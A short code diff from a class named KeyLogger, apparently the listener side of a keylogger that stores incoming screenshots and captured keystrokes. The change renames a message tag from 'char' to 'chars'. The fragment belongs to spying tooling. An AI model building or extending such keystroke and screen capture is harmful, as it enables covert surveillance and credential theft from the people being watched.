@@ -125,7 +125,7 @@ class KeyLogger(threading.Thread):
 						with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
 							handler.write(data[2])
 						logger.info('Done')
-				elif data[0] == "char":
+				elif data[0] == "chars":
 					write_file(os.path.join(path, filename), data[1:])
 					if gui_running:
 						self.gui.insert_data(data[1:])
